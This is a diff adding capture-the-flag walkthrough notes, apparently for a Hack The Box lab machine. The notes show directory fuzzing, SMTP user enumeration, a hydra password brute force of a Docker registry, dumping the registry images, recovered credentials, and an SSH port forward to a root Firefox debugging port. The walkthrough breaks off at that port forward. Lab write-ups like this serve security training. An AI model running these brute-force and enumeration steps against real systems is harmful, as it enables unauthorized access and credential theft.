@@ -14,3 +14,107 @@ sudo nano /etc/hosts
 
 # After reviewing the account we found its account login page. Lets create an account first 
 http://magicgardens.htb/login/
+
+# Nothing interested inside.
+
+# Lets proceed to subdomain and directory buster
+# Subdomain
+gobuster dns -d magicgardens.htb -w /home/kali/Tools/dict/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
+# No results
+
+# Dirbuster
+ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://magicgardens.htb/FUZZ -r
+...
+admin                   [Status: 200, Size: 4181, Words: 624, Lines: 129, Duration: 72ms]
+cart                    [Status: 200, Size: 5510, Words: 1274, Lines: 97, Duration: 393ms]
+catalog                 [Status: 200, Size: 29508, Words: 10308, Lines: 396, Duration: 314ms]
+check                   [Status: 200, Size: 6905, Words: 1720, Lines: 117, Duration: 175ms]
+login                   [Status: 200, Size: 6905, Words: 1720, Lines: 117, Duration: 229ms]
+profile                 [Status: 200, Size: 6905, Words: 1720, Lines: 117, Duration: 77ms]
+register                [Status: 200, Size: 7889, Words: 2173, Lines: 139, Duration: 236ms]
+restore                 [Status: 200, Size: 5979, Words: 1357, Lines: 103, Duration: 118ms]
+search                  [Status: 200, Size: 5621, Words: 1326, Lines: 99, Duration: 244ms]
+subscribe               [Status: 200, Size: 6905, Words: 1720, Lines: 117, Duration: 257ms]
+...
+
+# SMTP User Brute Force
+# We will use msf auxiliary/scanner/smtp/smtp_enum to brute force SMTP service
+...
+[*] 10.10.11.9:25         - 10.10.11.9:25 Banner: 220 magicgardens.magicgardens.htb ESMTP Postfix (Debian/GNU)
+[+] 10.10.11.9:25         - 10.10.11.9:25 Users found: , _apt, avahi-autoipd, backup, bin, daemon, games, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-network, uucp, www-data
+[*] 10.10.11.9:25         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+...
+# Found email user alex, then we still have port 5000 ssl/http Docker Registry (API: 2.0)
+
+# Docker Registry Brute Force
+hydra -l alex -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 https-get /v2/
+...
+[5000][http-get] host: 10.10.11.9   login: alex   password: diamonds
+...
+
+# Docuer Registry Enumeration
+https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry
+
+# List Repositories
+curl -k -u alex:diamonds https://10.10.11.9:5000/v2/_catalog
+...
+{"repositories":["magicgardens.htb"]}
+...
+
+# Get tags of a repositoru
+curl -s -k -u alex:diamonds https://10.10.11.9:5000/v2/magicgardens.htb/tags/list
+{"name":"magicgardens.htb","tags":["1.3"]}
+
+# Get Manifests
+curl -s -k -u alex:diamonds https://10.10.11.9:5000/v2/magicgardens.htb/manifests/1.3
+...
+{
+   "schemaVersion": 1,
+   "name": "magicgardens.htb",
+   "tag": "1.3",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+"v1Compatibility": "{\"id\":\"b296c87bc9a3ebdb9fb6c992b3e4f61e6b364be73864849e386a2dd0321856df\",\"created\":\"2023-08-16T00:59:30.831171691Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:3a6d159d80cb8abfacda5873c243a6ae635ff603708febc4df51f8eec26d3de7 in / \"]}}"
+"signatures": [
+      {
+         "header": {
+            "jwk": {
+               "crv": "P-256",
+               "kid": "OGIO:QCAM:YUBD:UX6U:XRU2:RP7H:VVTP:XW76:3YBX:6IT5:3WEY:XIHT",
+               "kty": "EC",
+               "x": "GkHH3nyqC-pOnEzzYFNZt5LZ3QiThJ5TKaOq7l5Z2gg",
+               "y": "EEge1l1XzewjRK8NuKFo6xjseQkC32MdGfQd_Yl1XSs"
+            },
+            "alg": "ES256"
+         },
+         "signature": "8y9rkgnsBYHoIM8bryDJfm8419n_Fam1X16TffiEULL4PBRdbyI3T7p_kbmzJi33rocnfNDAfeEZsv5ECifDWQ",
+         "protected": "eyJmb3JtYXRMZW5ndGgiOjIwNzU5LCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjQtMDUtMjNUMTQ6MjM6MzlaIn0"
+      }
+   ]
+} 
+
+# Found some interesting file from the v1Compatibility
+# We can use DockerRegistryGrabber to download into local KALI
+https://github.com/Syzik/DockerRegistryGrabber
+
+python drg.py -U alex -P diamonds https://10.10.11.9 --dump_all
+
+
+
+morty:jonasbrothers
+
+# Use this credentials access to the admin console
+
+# Access with ssh and upload linpeas to the target system
+
+ps aux | grep fire
+root        2035  1.4  8.2 2789312 329948 ?      Sl   10:31   0:18 firefox-esr --marionette --headless --remote-debugging-port 49385 --remote-allow-hosts localhost -no-remote -profile /tmp/rust_mozprofileyKCvhN
+
+ssh -L 49385:localhost:49385 morty@10.10.11.9 
+
+http://127.0.0.1:49385/
